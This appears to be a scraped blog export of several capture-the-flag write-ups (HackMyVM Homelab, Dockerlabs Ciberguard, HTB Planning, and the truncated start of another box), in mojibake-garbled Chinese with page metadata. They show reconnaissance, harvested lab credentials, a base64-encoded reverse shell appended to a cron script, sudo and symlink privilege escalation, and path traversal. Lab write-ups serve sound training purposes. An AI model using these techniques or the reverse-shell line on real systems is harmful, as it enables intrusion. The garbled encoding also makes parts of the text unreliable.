\u0026lt;think\u0026gt;\rEmm, I\u0026#39;m so tired and don\u0026#39;t want to answer any questions.\r\u0026lt;/think\u0026gt;\rThinking has stopped.\rThe server is busy, please try again later.\r[*] in execute()\r[*] running shell ä½†æ˜¯å¥½åƒå¹¶ä¸èƒ½è·å¾—åˆ°shellï¼Œæˆ‘ä¹Ÿå°è¯•è¿‡ret2shellcodeè§£æ³•ï¼Œä½†æ˜¯å¥½åƒæ²¡æœ‰å¯æ‰§è¡Œæ®µï¼ˆå¯èƒ½æ˜¯æˆ‘pwnå¤ªèœäº†\nå›åˆ°æœºå™¨æœ¬èº«ï¼Œæ³¨æ„åˆ°è¯¥æ–‡ä»¶åœ¨ç”¨æˆ·çš„å®¶ç›®å½•ä¸‹ï¼Œå› æ­¤å¯ä»¥ä»»æ„ä¿®æ”¹ã€‚\nhomelab:~$ rm deepseek rm: remove \u0026#39;deepseek\u0026#39;? y\rhomelab:~$ echo \u0026#39;sh\u0026#39; \u0026gt; deepseek\rhomelab:~$ chmod +x deepseek homelab:~$ sudo /home/shinosawa/deepseek /home/shinosawa # id\ruid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\r/home/shinosawa # Summary #\rUser: ç›®å½•æ‰«æå¾—åˆ°openvpnçš„å…³é”®æ–‡ä»¶ï¼Œé€šè¿‡pkcs8çˆ†ç ´å¯†ç æˆåŠŸè¿›å…¥å†…ç½‘ï¼Œæ‰«æå†…ç½‘å­˜æ´»ä¸»æœºï¼Œé€šè¿‡22ç«¯å£ç™»å½•ã€‚\nRoot: å®¶ç›®å½•ç›´æ¥ä¿®æ”¹æ–‡ä»¶ã€‚\n","date":"2025-05-17","externalUrl":null,"permalink":"/posts/2025/05/hackmyvm-homelab/","section":"Posts","summary":"","title":"HackMyVM-Homelab","type":"posts"},{"content":"","date":"2025-05-17","externalUrl":null,"permalink":"/links/","section":"Links","summary":"","title":"Links","type":"links"},{"content":"","date":"2025-05-17","externalUrl":null,"permalink":"/tags/linux/","section":"Tags","summary":"","title":"Linux","type":"tags"},{"content":"","date":"2025-05-17","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"2025-05-17","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"2025-05-13","externalUrl":null,"permalink":"/tags/dockerlabs/","section":"Tags","summary":"","title":"Dockerlabs","type":"tags"},{"content":"","date":"2025-05-13","externalUrl":null,"permalink":"/categories/dockerlabs/","section":"Categories","summary":"","title":"Dockerlabs","type":"categories"},{"content":"\rMachine Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/ciberguard â¯ nmap 172.17.0.2 -sV -A -p- PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 01:f6:3a:98:23:dc:8b:00:f0:5c:d5:50:07:f9:ec:e7 (ECDSA)\r|_ 256 b0:4e:cb:2a:e0:ac:cf:4c:14:7b:23:57:00:6d:12:1d (ED25519)\r80/tcp open http Apache httpd 2.4.58 ((Ubuntu))\r|_http-server-header: Apache/2.4.58 (Ubuntu)\r|_http-title: CyberGuard - Seguridad Digital Feroxbuster #\r[root@kali] /home/kali/ciberguard â¯ feroxbuster -u \u0026#39;http://172.17.0.2/\u0026#39; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt ___ ___ __ __ __ __ __ ___\r|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__\r| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___\rby Ben \u0026#34;epi\u0026#34; Risher ğŸ¤“ ver: 2.11.0\râ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\rğŸ¯ Target Url â”‚ http://172.17.0.2/\rğŸš€ Threads â”‚ 50\rğŸ“– Wordlist â”‚ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\rğŸ‘Œ Status Codes â”‚ All Status Codes!\rğŸ’¥ Timeout (secs) â”‚ 7\rğŸ¦¡ User-Agent â”‚ feroxbuster/2.11.0\rğŸ’‰ Config File â”‚ /etc/feroxbuster/ferox-config.toml\rğŸ” Extract Links â”‚ true\rğŸ’² Extensions â”‚ [php, txt]\rğŸ HTTP methods â”‚ [GET]\rğŸ”ƒ Recursion Depth â”‚ 4\râ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\rğŸ Press [ENTER] to use the Scan Management Menuâ„¢\râ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r404 GET 9l 31w 272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\r301 GET 9l 28w 309c http://172.17.0.2/images =\u0026gt; http://172.17.0.2/images/\r200 GET 77l 154w 2111c http://172.17.0.2/archiv/script.js\r200 GET 311l 560w 5015c http://172.17.0.2/archiv/styles.css\r200 GET 231l 1204w 142716c http://172.17.0.2/images/Imagen(1).jpg\r200 GET 59l 323w 28431c http://172.17.0.2/images/Image.jpg\r200 GET 103l 363w 5100c http://172.17.0.2/\r200 GET 279l 1484w 159900c http://172.17.0.2/images/Imagen%282%29.jpg\r200 GET 12l 114w 7473c http://172.17.0.2/images/Iconn.png\r200 GET 190l 1007w 91180c http://172.17.0.2/images/Imagen%285%29.png.jpg\r200 GET 195l 1148w 120954c http://172.17.0.2/images/Imagen%283%29.jpg\r200 GET 243l 1220w 121023c http://172.17.0.2/images/Imagen%284%29.jpg\r200 GET 231l 1204w 142716c http://172.17.0.2/images/Imagen%281%29.jpg\r301 GET 9l 28w 309c http://172.17.0.2/archiv =\u0026gt; http://172.17.0.2/archiv/\r403 GET 9l 28w 275c http://172.17.0.2/server-status\r[####################] - 29s 661689/661689 0s found:14 errors:1341 [####################] - 28s 661638/661638 23558/s http://172.17.0.2/ [####################] - 0s 661638/661638 3576422/s http://172.17.0.2/images/ =\u0026gt; Directory listing (add --scan-dir-listings to scan)\r[####################] - 0s 661638/661638 330819000/s http://172.17.0.2/archiv/ =\u0026gt; Directory listing (add --scan-dir-listings to scan) Own chloe #\ræŸ¥çœ‹åˆ°ç›®å½•ä¸‹æœ‰ä¸€ä¸ª**/archiv/script.js**\nconst usuariosPermitidos = {\r\u0026#39;admin\u0026#39;: \u0026#39;CyberSecure123\u0026#39;,\r\u0026#39;cliente\u0026#39;: \u0026#39;Password123\u0026#39;,\r\u0026#39;chloe\u0026#39; : \u0026#39;chloe123\u0026#39;\r}; å…¶ä¸­chloeå¯ä»¥ç”¨äºsshç™»å½•\nOwn veronica #\rå¯ä»¥ç›´æ¥è¿›å…¥åˆ°å®¶ç›®å½•ï¼Œåœ¨.bash_historyä¸­å¾—åˆ°å¯†ç \nchloe@6e97f12b7ffe:/home/veronica$ ls -al\rtotal 56\rdrwxr-xrwx 1 veronica veronica 4096 Apr 18 16:35 .\rdrwxr-xr-x 1 root root 4096 Apr 16 23:03 ..\r-rw-r--r-- 1 veronica veronica 25 May 13 09:25 .bash_history\r-rw-r--r-- 1 veronica veronica 220 Apr 16 23:00 .bash_logout\r-rw-r--r-- 1 veronica veronica 3771 Apr 16 23:00 .bashrc\rdrwx------ 2 veronica veronica 4096 Apr 18 10:39 .cache\rdrwxrwxr-x 3 veronica veronica 4096 Apr 18 11:13 .local\r-rw-r--r-- 1 veronica veronica 807 Apr 16 23:00 .profile\r-rw------- 1 veronica veronica 7 Apr 18 16:35 .python_history\rdrwxrwxr-x 2 veronica veronica 4096 Apr 18 10:44 Desktop\rdrwxrwxr-x 2 veronica veronica 4096 Apr 18 10:44 Documents\rdrwxrwxr-x 2 veronica veronica 4096 Apr 18 10:44 Images\rchloe@6e97f12b7ffe:/home/veronica$ cat .bash_history dmVyb25pY2ExMjMK è¿™ä¸ªdmVyb25pY2ExMjMKå°±æ˜¯å¯†ç ï¼Œä¸ç”¨è§£å¯†\nOwn pablo #\ræŸ¥çœ‹ä¸€ä¸‹å®šæ—¶ä»»åŠ¡\nchloe@6e97f12b7ffe:/home/veronica/.local$ cat /etc/crontab # /etc/crontab: system-wide crontab\r# Unlike any other crontab you don\u0026#39;t have to run the `crontab\u0026#39;\r# command to install the new version when you edit this file\r# and files in /etc/cron.d. These files also have username fields,\r# that none of the other crontabs do.\rSHELL=/bin/sh\r# You can also override PATH, but by default, newer versions inherit it from the environment\r#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\r# Example of job definition:\r# .---------------- minute (0 - 59)\r# | .------------- hour (0 - 23)\r# | | .---------- day of month (1 - 31)\r# | | | .------- month (1 - 12) OR jan,feb,mar,apr ...\r# | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat\r# | | | | |\r# * * * * * user-name command to be executed\r17 * * * * root cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly\r25 6 * * * root test -x /usr/sbin/anacron || { cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily; }\r47 6 * * 7 root test -x /usr/sbin/anacron || { cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly; }\r52 6 1 * * root test -x /usr/sbin/anacron || { cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly; }\r* * * * * pedro /home/veronica/.local/script-h.sh \u0026gt; /tmp/hora/hora.log 2\u0026gt;\u0026amp;1\r# å½“å‰ç”¨æˆ·å¯ä»¥ç›´æ¥ä¿®æ”¹è¿™ä¸ªè„šæœ¬\nveronica@6e97f12b7ffe:~/.local$ echo \u0026#39;printf KGJhc2ggPiYgL2Rldi90Y3AvMTcyLjE3LjAuMS80NDQ0IDA+JjEpICY=|base64 -d|bash\u0026#39; \u0026gt;\u0026gt; script-h.sh Root #\ræŸ¥çœ‹sudo -l\npablo@6e97f12b7ffe:~$ sudo -l\rMatching Defaults entries for pablo on 6e97f12b7ffe:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser pablo may run the following commands on 6e97f12b7ffe:\r(ALL) NOPASSWD: /usr/bin/python3 /opt/nllns/clean_symlink.py *.jpg æŸ¥çœ‹ä¸€ä¸‹è„šæœ¬çš„å†…å®¹\npablo@6e97f12b7ffe:~$ cat /opt/nllns/clean_symlink.py #!/usr/bin/env python3\rimport os\rimport sys\rimport shutil\rQUAR_DIR = \u0026#34;/var/quarantined\u0026#34;\rif len(sys.argv) != 2:\rprint(\u0026#34;Â¡Se requiere un argumento: el enlace simbÃ³lico a un archivo .jpg!\u0026#34;)\rsys.exit(1)\rLINK = sys.argv[1]\rif not LINK.endswith(\u0026#39;.jpg\u0026#39;):\rprint(\u0026#34;Â¡El primer argumento debe ser un archivo .jpg!\u0026#34;)\rsys.exit(2)\rif os.path.islink(LINK):\rLINK_NAME = os.path.basename(LINK)\rLINK_TARGET = os.readlink(LINK)\rif \u0026#39;etc\u0026#39; in LINK_TARGET or \u0026#39;root\u0026#39; in LINK_TARGET:\rprint(f\u0026#34;Â¡Intentando leer archivos crÃ­ticos, eliminando enlace [{LINK}]!\u0026#34;)\ros.unlink(LINK)\relse:\rprint(f\u0026#34;Enlace encontrado [{LINK}], moviÃ©ndolo a cuarentena.\u0026#34;)\rshutil.move(LINK, os.path.join(QUAR_DIR, LINK_NAME))\rif os.path.exists(os.path.join(QUAR_DIR, LINK_NAME)):\rprint(\u0026#34;Contenido:\u0026#34;)\rwith open(os.path.join(QUAR_DIR, LINK_NAME), \u0026#39;r\u0026#39;) as f:\rprint(f.read())\relse:\rprint(f\u0026#34;El enlace [{LINK}] no es un enlace simbÃ³lico.\u0026#34;) å¤§æ¦‚å°±æ˜¯å¦‚æœä½ èƒ½æ§åˆ¶ä¼ å…¥çš„ .jpg ç¬¦å·é“¾æ¥æŒ‡å‘ä½ æƒ³è¯»çš„æ–‡ä»¶ï¼ˆä¸åœ¨ /etc æˆ– /root é‡Œï¼‰ï¼Œå¯ä»¥åˆ©ç”¨å®ƒæ¥é—´æ¥è¯»å–æ–‡ä»¶å†…å®¹ã€‚\nä¾‹å¦‚ğŸ‘‡\npablo@6e97f12b7ffe:/tmp$ echo 1231231 \u0026gt; aaaa\rpablo@6e97f12b7ffe:/tmp$ ln -s /tmp/aaaa fake.jpg\rpablo@6e97f12b7ffe:/tmp$ sudo /usr/bin/python3 /opt/nllns/clean_symlink.py /tmp/fake.jpg Enlace encontrado [/tmp/fake.jpg], moviÃ©ndolo a cuarentena.\rContenido:\r1231231 ä½†æ˜¯å‘¢ä¹Ÿåªèƒ½è¯»å–åˆ°éé‡è¦æ–‡ä»¶ï¼Œ\nå°†ç›®å…‰æ”¾åˆ°/tmpç›®å½•ä¸‹ï¼Œæœ‰ä¸€ä¸ªid_rsaç›®å½•ï¼Œè™½ç„¶æ‹¥æœ‰è€…æ˜¯pablo\npablo@6e97f12b7ffe:/tmp$ ls -al\rtotal 28\rdrwxrwxrwt 1 root root 4096 May 13 09:59 .\rdrwxr-xr-x 1 root root 4096 May 13 09:07 ..\rdrwxrwxrwx 1 root root 4096 Apr 17 17:14 hora\r-rw------- 1 pablo pablo 3381 May 2 16:58 id_rsa ä½†æ˜¯åˆšå¥½å¯ä»¥ç”¨å®ƒæ¥ç™»å½•åˆ°root\npablo@6e97f12b7ffe:/tmp$ ssh -i id_rsa root@127.0.0.1\rWelcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.12.13-amd64 x86_64)\r* Documentation: https://help.ubuntu.com\r* Management: https://landscape.canonical.com\r* Support: https://ubuntu.com/pro\rThis system has been minimized by removing packages and content that are\rnot required on a system that users do not log into.\rTo restore this content, you can run the \u0026#39;unminimize\u0026#39; command.\rLast login: Tue May 13 09:52:11 2025 from 127.0.0.1\rroot@6e97f12b7ffe:~# id\ruid=0(root) gid=0(root) groups=0(root)\rroot@6e97f12b7ffe:~# Summary #\ræ€»ä½“æ¥è¯´æ²¡ä»€ä¹ˆéš¾åº¦ï¼Œæœ€åçš„éƒ¨åˆ†è®©æˆ‘æƒ³èµ·äº†è¿™ä¸ªæœºå™¨ï¼šHTB-LinkVortex - HYH\nä»–æœ€åä¹Ÿæœ‰ä¸€ä¸ªè½¯é“¾æ¥ææƒï¼Œ å¯ä»¥é€šè¿‡äºŒçº§é“¾æ¥ç»•è¿‡ï¼Œåœ¨æœ¬æœºå™¨ä¸Šå°±æ— æ³•å®Œæˆã€‚\n","date":"2025-05-13","externalUrl":null,"permalink":"/posts/2025/05/dockerlabs-ciberguard/","section":"Posts","summary":"","title":"Dockerlabs-Ciberguard","type":"posts"},{"content":"","date":"2025-05-12","externalUrl":null,"permalink":"/tags/hackthebox/","section":"Tags","summary":"","title":"Hackthebox","type":"tags"},{"content":"","date":"2025-05-12","externalUrl":null,"permalink":"/categories/htb-machine/","section":"Categories","summary":"","title":"HTB-Machine","type":"categories"},{"content":"\rBox Info #\rOS Linux Difficulty Easy As is common in real life pentests, you will start the Planning box with credentials for the following account: admin / 0D5oT70Fq13EvB5r\nNmap #\r[root@kali] /home/kali/Planning â¯ nmap planning.htb -sV -A PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA) |_ 256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519) 80/tcp open http nginx 1.24.0 (Ubuntu) |_http-server-header: nginx/1.24.0 (Ubuntu) |_http-title: Edukate - Online Education Website 80ç«¯å£æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ä¸œè¥¿ï¼Œå°è¯•çˆ†ç ´å­åŸŸå\nSubdomain Fuzz #\r[root@kali] /home/kali/Planning â¯ ffuf -u http://planning.htb/ -w /usr/share/fuzzDicts/subdomainDicts/main.txt -H \u0026#34;Host:FUZZ.planning.htb\u0026#34; -fs 178 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://planning.htb/ :: Wordlist : FUZZ: /usr/share/fuzzDicts/subdomainDicts/main.txt :: Header : Host: FUZZ.planning.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response size: 178 ________________________________________________ grafana [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 98ms] æ·»åŠ grafana.planning.htbåˆ°/etc/hosts\nCVE-2024-9264 #\rç»è¿‡æœç´¢æˆ‘æ‰¾åˆ°äº†ä¸€ä¸ªå¯ä»¥æ‹¿åˆ°shellçš„cve\nz3k0sec/CVE-2024-9264-RCE-Exploit: Grafana RCE exploit (CVE-2024-9264) å½“å‰åº”è¯¥æ˜¯åœ¨dockerç¯å¢ƒä¸­ï¼Œéœ€è¦é€ƒé€¸å‡ºå»\næŸ¥çœ‹ä¸€ä¸‹envç¯å¢ƒå˜é‡\nGF_SECURITY_ADMIN_PASSWORD=RioTecRXXXXXXXXXXXXXXX GF_SECURITY_ADMIN_USER=enzo å¯ä»¥ç›´æ¥ç™»å½•ssh\nRoot #\ræ‰¾åˆ°ä¸€ä¸ªjsonæ–‡ä»¶\nâ¯ cat crontab.db| jq { \u0026#34;name\u0026#34;: \u0026#34;Grafana backup\u0026#34;, \u0026#34;command\u0026#34;: \u0026#34;/usr/bin/docker save root_grafana -o /var/backups/grafana.tar \u0026amp;\u0026amp; /usr/bin/gzip /var/backups/grafana.tar \u0026amp;\u0026amp; zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz \u0026amp;\u0026amp; rm /var/backups/grafana.tar.gz\u0026#34;, \u0026#34;schedule\u0026#34;: \u0026#34;@daily\u0026#34;, \u0026#34;stopped\u0026#34;: false, \u0026#34;timestamp\u0026#34;: \u0026#34;Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)\u0026#34;, \u0026#34;logging\u0026#34;: \u0026#34;false\u0026#34;, \u0026#34;mailing\u0026#34;: {}, \u0026#34;created\u0026#34;: 1740774983276, \u0026#34;saved\u0026#34;: false, \u0026#34;_id\u0026#34;: \u0026#34;GTI22PpoJNtRKg0W\u0026#34; } { \u0026#34;name\u0026#34;: \u0026#34;Cleanup\u0026#34;, \u0026#34;command\u0026#34;: \u0026#34;/root/scripts/cleanup.sh\u0026#34;, \u0026#34;schedule\u0026#34;: \u0026#34;* * * * *\u0026#34;, \u0026#34;stopped\u0026#34;: false, \u0026#34;timestamp\u0026#34;: \u0026#34;Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)\u0026#34;, \u0026#34;logging\u0026#34;: \u0026#34;false\u0026#34;, \u0026#34;mailing\u0026#34;: {}, \u0026#34;created\u0026#34;: 1740849309992, \u0026#34;saved\u0026#34;: false, \u0026#34;_id\u0026#34;: \u0026#34;gNIRXh1WIc9K7BYX\u0026#34; } é‡Œé¢æœ‰ä¸€ä¸ªå¯†ç ï¼šP4ssw0rdS0pRi0T3cï¼Œä½†ä¸æ˜¯rootçš„å¯†ç \næ²¡æœ‰æ‰¾åˆ°èƒ½ç”¨çš„ä¸œè¥¿ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ç«¯å£å¼€æ”¾æƒ…å†µ\nenzo@planning:~$ ss -tuln\rNetid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process udp UNCONN 0 0 127.0.0.54:53 0.0.0.0:* udp UNCONN 0 0 127.0.0.53%lo:53 0.0.0.0:* tcp LISTEN 0 151 127.0.0.1:3306 0.0.0.0:* tcp LISTEN 0 511 0.0.0.0:80 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.1:37121 0.0.0.0:* tcp LISTEN 0 70 127.0.0.1:33060 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.54:53 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.1:3000 0.0.0.0:* tcp LISTEN 0 511 127.0.0.1:8000 0.0.0.0:* tcp LISTEN 0 4096 *:22 *:* æ³¨æ„åˆ°å¼€æ”¾äº†ä¸€ä¸ª8000ç«¯å£ï¼Œå°†å…¶è½¬å‘å‡ºæ¥\n[root@kali] /home/kali/Planning â¯ ssh enzo@planning.htb -L 8000:127.0.0.1:8000 å°è¯•äº†ä¸€ä¸‹ï¼Œå¯ä»¥ç›´æ¥è¿™æ ·ç™»å½•ğŸ‘‡\nå®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªå®šæ—¶ä»»åŠ¡çš„webæ§åˆ¶ç«¯\nå¯ä»¥ç›´æ¥å†™å…¥è®¾ç½®SUIDçš„å‘½ä»¤\nè¿è¡Œä¹‹åå³å¯çœ‹åˆ°æˆåŠŸææƒ\nSummary #\rUser: å­åŸŸåçˆ†ç ´ï¼Œç”¨å·²çŸ¥çš„ç”¨æˆ·åå’Œå¯†ç ç™»å½•åˆ°åå°ï¼Œé€šè¿‡CVEæ‹¿åˆ°dockerå®¹å™¨çš„shellï¼Œåœ¨ç¯å¢ƒå˜é‡ä¸­æ‹¿åˆ°enzoçš„ç™»å½•å¯†ç ã€‚\nRoot: åœ¨/opt/crontabsç›®å½•ä¸‹æ‹¿åˆ°ä¸€ä¸ªå¯†ç ï¼Œå†…ç½‘8000ç«¯å£è½¬å‘å‡ºå»å¯ä»¥ç”¨äºwebç™»å½•ï¼Œè®¾ç½®å®šæ—¶ä»»åŠ¡è®¾ç½®bashçš„SUIDã€‚\n","date":"2025-05-12","externalUrl":null,"permalink":"/posts/2025/05/htb-planning/","section":"Posts","summary":"","title":"HTB-Planning","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/pycrt â¯ nmap 192.168.55.36 -sV -A -p- PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\r| ssh-hostkey: | 3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)\r| 256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)\r|_ 256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)\r80/tcp open http Apache httpd 2.4.62 ((Debian))\r|_http-title: Apache2 Debian Default Page: It works\r|_http-server-header: Apache/2.4.62 (Debian)\r6667/tcp open irc\r| irc-info: | users: 1\r| servers: 1\r| chans: 0\r| lusers: 1\r| lservers: 0\r| server: irc.local\r| version: InspIRCd-3. irc.local | source ident: nmap\r| source host: 192.168.55.4\r|_ error: Closing link: (nmap@192.168.55.4) [Client exited] 80ç«¯å£æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„ä¿¡æ¯ï¼Œåªæ˜¯ä¸€ä¸ªé™æ€é¡µé¢\nIrssi #\rè¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯irssiæ¥è¿›è¡Œircè¿æ¥ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨weechat\n2024å¹´8ä¸ªæœ€ä½³Linux IRCå®¢æˆ·ç«¯æ•´ç† - ç¥ç®—ID - åšå®¢å›­ [(status)] /connect 192.168.55.36 6667 æ¬¢è¿ä¿¡æ¯ä¸­æåˆ°äº†ä¸€ä¸ªShadowSecç›®å½•ï¼Œå¹¶ä¸”èƒ½å¤Ÿè®¿é—®\nFeroxbuster #\r[root@kali] /home/kali/pycrt â¯ feroxbuster -u \u0026#39;http://192.168.55.36/ShadowSec/\u0026#39; -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x php,txt\r___ ___ __ __ __ __ __ ___\r|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__\r| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___\rby Ben \u0026#34;epi\u0026#34; Risher ğŸ¤“ ver: 2.11.0\râ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\rğŸ¯ Target Url â”‚ http://192.168.55.36/ShadowSec/\rğŸš€ Threads â”‚ 50\rğŸ“– Wordlist â”‚ /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt\rğŸ‘Œ Status Codes â”‚ All Status Codes!\rğŸ’¥ Timeout (secs) â”‚ 7\rğŸ¦¡ User-Agent â”‚ feroxbuster/2.11.0\rğŸ’‰ Config File â”‚ /etc/feroxbuster/ferox-config.toml\rğŸ” Extract Links â”‚ true\rğŸ’² Extensions â”‚ [php, txt]\rğŸ HTTP methods â”‚ [GET]\rğŸ”ƒ Recursion Depth â”‚ 4\râ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\rğŸ Press [ENTER] to use the Scan Management Menuâ„¢\râ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\r404 GET 9l 31w 275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\r403 GET 9l 28w 278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\r200 GET 185l 509w 6270c http://192.168.55.36/ShadowSec/\r200 GET 1l 4w 21c http://192.168.55.36/ShadowSec/bydataset.php\r[####################] - 9m 3555720/3555720 0s found:2 errors:0 [####################] - 9m 3555720/3555720 6573/s http://192.168.55.36/ShadowSec/ æ‰¾åˆ°ä¸€ä¸ªbydataset.phpï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿\n[root@kali] /home/kali â¯ curl http://192.168.55.36/ShadowSec/bydataset.php Nothing to see here. FFUF #\r[root@kali] /home/kali â¯ ffuf -u \u0026#39;http://192.168.55.36/ShadowSec/bydataset.php?FUZZ=../../.././../../etc/passwd\u0026#39; -w /usr/share/fuzzDicts/paramDict/AllParam.txt -fs 21\r/\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev\r________________________________________________\r:: Method : GET\r:: URL : http://192.168.55.36/ShadowSec/bydataset.php?FUZZ=../../.././../../etc/passwd\r:: Wordlist : FUZZ: /usr/share/fuzzDicts/paramDict/AllParam.txt\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 40\r:: Matcher : Response status: 200-299,301,302,307,401,403,405,500\r:: Filter : Response size: 21\r________________________________________________\rfile [Status: 200, Size: 1452, Words: 13, Lines: 28, Duration: 2ms]\r:: Progress: [74332/74332] :: Job [1/1] :: 5555 req/sec :: Duration: [0:00:13] :: Errors: 0 :: å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´\n[root@kali] /home/kali â¯ curl 